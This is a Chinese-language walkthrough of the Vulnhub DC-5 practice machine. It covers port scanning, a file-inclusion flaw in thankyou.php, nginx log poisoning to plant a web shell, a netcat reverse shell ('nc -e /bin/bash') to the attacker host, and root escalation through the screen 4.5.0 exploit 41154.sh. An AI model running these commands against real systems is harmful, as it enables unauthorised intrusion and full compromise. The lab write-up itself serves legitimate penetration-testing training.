\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/3cR0X3-YMdInt7zNjzxO8g)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-5 全程只有一个 falg，获取 root 权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

Download (Mirror): 

https://download.vulnhub.com/dc/DC-5.zip

目标机 IP 地址：192.168.5.140  
攻击机 kali IP 地址：192.168.5.135

arp-scan -l 发现目标 ip。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT08TFHbica0M7o5yERYL72ibgGEvC0Z0c8fXRvicvIT4yGPwtzjBooJIzIQ/640?wx_fmt=png)

nmap 端口扫描，开发了 80 端口。  

nmap -sV -p- 192.168.5.140

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0E6vBI6Xm8GZCSqxiar6VZh59WFzkM9NuW13EWLFXtNu0hjoHr1Ics2A/640?wx_fmt=png)

访问 80 端口。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0SMKmBgypf9sIbHknhmmxHHQOky74mKrYJQorCuuHuGCJcpMh1TiaKtg/640?wx_fmt=png)

观察到版权标识后的年份刷新后会发生变化，怀疑是该站点有文件包含漏洞，包含了某个文件，然后渲染到页面中。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASdzzemawMzJodhmBVsnxBEfZBvZKkhXpvQpANGvB5HNwwKDhkVwaPJg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASklVFuHC9iaws6ZMDxwNWlWeVfQ5CDIvg3z3KaCHnF8yrDjZpKt45mxA/640?wx_fmt=png)

爆破后得知该页面通过可控参数 file 来包含其他文件。  

http://192.168.5.140/thankyou.php?file=/etc/passwd 

确定存在文件包含漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASkT7fpVcVUY16KiamvibnXgm3XAIria6hPy5GBAXDB3QL2ppcon5MwENRA/640?wx_fmt=png)

/var/log/nginx/error.log Nginx 日志文件，将一句话写入到日志文件里。

写入一句话成功后，蚁剑链接。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT06k5AWLDdjbF0959Kpiau6Vraue91uLCXjVjx6ctKicTCEoPa4GTXd1eQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0ovEjFEoq04vStmzqicWYOUBuXq7YzqwMZorRr6RdpBzpQ8Z0icnmLeIA/640?wx_fmt=png)

反弹 shell。

 nc -e /bin/bash 192.168.5.135 7777

 并转换交互模式。

python -c 'import pty;pty.spawn("/bin/bash")'  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT08lxmDicok4lZVjbU9xgxKmCLkRwkfKLcgeC6wp8pKuFDU7GPzNMCT5A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT09gCHuoZBnUIDjN6sbYPYibPSNZMvgke4ntGLvKBeRhyy7AxQ7aJJ84w/640?wx_fmt=png)

查找一下可以用 root 权限运行的命令；

find / -perm -u=s -type f 2>/dev/null

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0P4ESULOKKclibQicHW5Kuvx4PPQiaZLibYL3vlIfv2dYWoMX3HzCicUwoYQ/640?wx_fmt=png)

发现 screen 4.5.0， screen 4.5.0 是由提权漏洞的，搜索利用方式。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0o6LiaREDALWQ1KgXhRPHG5rnnAguy2NxYpxFHgHtHwpFgHWY73zZorg/640?wx_fmt=png)

搜索文件位置查看利用方式。  

/usr/share/exploitdb/exploits/linux/local/41154.sh

chmod 777 41154.sh 

重新设置文件格式。

:set:ff 回车  

:set ff=unix

:wq

41154.sh 脚本中分三部分，将第一部分、第二部分的 c 语言代码抽离，独立保存，根据里面的提示进行编译。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0icUcIINnelzTN0G2a8iaRhPaL04iaQ86R1sUkguR1uPwnc1gXceicV6RWw/640?wx_fmt=png)

将第一部分 C 语言代码保存到 libhax.c。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASCq5I3WBus64FT9nWDP5aSwKm3cRcGnMVt52EaH3ussvB5JeTeXIQHg/640?wx_fmt=png)

根据提示进行编译，编译后删除源文件。  

gcc -fPIC -shared -ldl -o libhax.so libhax.c 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASqeUItJtru5P7lnrBzkGHGaD32FyRZj9hnS8lJ3goWnFlXPT1CbtWrQ/640?wx_fmt=png)

把下面部分 c 语言代码也单独复制出来取文件名为 rootshell.c。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASLKxFGmxjD9slvXmWYNDTxFgbrj70HDoXX8gXkVn6Wc6W6qCIqjibV8g/640?wx_fmt=png)

根据提示进行编译，编译后删除源文件。

gcc -o rootshell rootshell.c

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASDyjw140vweBzNMBvZcLfiaiaY1A2YAGD3YPFcrClJ7R9dts45pNSzicNQ/640?wx_fmt=png)

将 41154.sh 进行修改，并且改名为 dc5.sh。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASNtxxTz40tq3XMVEPAkOLtQ6HfjesOaoxw5SIGmHiaxsRZm8wa8s4Bicg/640?wx_fmt=png)

开启 ftp 服务：  

apt-get install vsftpd

vsftpd 服务开启 ftp。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0OAb25BLecovVHPVhQG9IwXb2R5vSBZu658YG6hFia218ibErjB8P6Iyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASXDuG3JwrOGN2Cmn8icibU8J2gUic4Iube9ZEWibD4icP1A0uBn66mT5wLBw/640?wx_fmt=png)

查看文件的权限。/tmp 下文件可任意读写，ftp 链接，将编译好的文件下载到本地 / tmp 下。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASKJE3N8VicZicTHhMbUV87AS9K6iaADrhXpMicd6T2iaPEOVGcB7fiaoiaG7rQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT03Nuhpwp9XjNGNZPNfLPgLMAicnuKpXcIlSgia78I18cibaLiaMJkSB4s2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24aeMoWonbLTVoaGVCpKyT0y8M0lPRDsXiczsLBoand0Jtjiao4KEYggFretIowE36t46ic6wpW1gFgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASUWYWYOeKzJHcb9P8PLibFibUfYsmxP6BU4lciaBanExRCE3W1UZaUR9hQ/640?wx_fmt=png)

chmod +x dc5.sh 执行权限，然后执行。/dc5.sh 获取 root 权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuAS4n9vJeWvKPyGT26ynmkwpibQFtOmN0wkYolQzIOuFDKWz2QF9BJnbpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24PPTIFYpt87nJkyJSqMuASdIcibEmBx2vkKvTgE5AlmcplQuqm6A1icCb6BwoGH3l9oxcbibRCsjWjA/640?wx_fmt=png)